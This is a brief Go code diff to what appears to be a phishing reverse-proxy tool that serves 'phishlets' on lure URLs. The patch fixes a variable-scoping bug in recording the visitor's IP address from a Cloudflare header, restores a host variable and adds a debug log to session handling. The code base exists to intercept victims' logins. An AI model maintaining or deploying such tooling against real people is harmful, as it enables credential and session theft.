@@ -207,7 +207,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
-			// o_host := req.Host
+			o_host := req.Host
 			lure_url := req_url
 			req_path := req.URL.Path
 			if req.URL.RawQuery != "" {
@@ -217,10 +217,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 
 			pl := p.getPhishletByPhishHost(req.Host)
+			remote_addr := "" 
 			if req.Header.Get("CF-Connecting-IP") != "" {
 				remote_addr = req.Header.Get("CF-Connecting-IP")
 			} else {
-				remote_addr := from_ip
+				remote_addr = from_ip
 
 			}
 
@@ -1840,6 +1841,7 @@ func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
 }
 
 func (p *HttpProxy) handleSession(hostname string) bool {
+	log.Debug("[handleSession] hostname: " + hostname)
 	for site, pl := range p.cfg.phishlets {
 		if p.cfg.IsSiteEnabled(site) {
 			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
